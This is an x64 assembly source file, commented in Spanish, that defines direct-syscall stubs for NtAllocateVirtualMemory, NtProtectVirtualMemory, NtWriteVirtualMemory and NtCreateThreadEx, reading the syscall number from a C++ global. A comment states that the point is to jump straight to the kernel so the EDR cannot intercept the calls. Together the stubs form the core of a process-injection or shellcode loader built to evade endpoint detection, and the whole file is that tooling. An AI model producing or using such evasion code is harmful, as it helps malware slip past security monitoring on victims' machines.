section .text
global NtAllocVirtualMem
global NtProtectVirtualMem
global NtWriteVirtualMem
global NtCreateThreadEx
extern g_ssn        ; variable global definida en el .cpp

NtAllocVirtualMem:
    mov r10, rcx                    ; Windows x64 calling convention:
                                    ; el kernel espera el primer argumento en r10
                                    ; no en rcx (que reserva Windows internamente)
    movzx eax, word [rel g_ssn]     ; leer el SSN desde la variable global
                                    ; movzx limpia los bits altos de eax
                                    ; rel = RIP-relative, necesario en x64
                                    ; para acceder a variables globales de C++
    syscall                         ; saltar directo al kernel
                                    ; el EDR no puede interceptar esto
    ret

NtProtectVirtualMem:
    mov r10, rcx
    movzx eax, word [rel g_ssn]
    syscall
    ret

NtWriteVirtualMem:
    mov r10, rcx
    movzx eax, word [rel g_ssn]
    syscall
    ret

NtCreateThreadEx:
    mov r10, rcx
    movzx eax, word [rel g_ssn]
    syscall
    ret
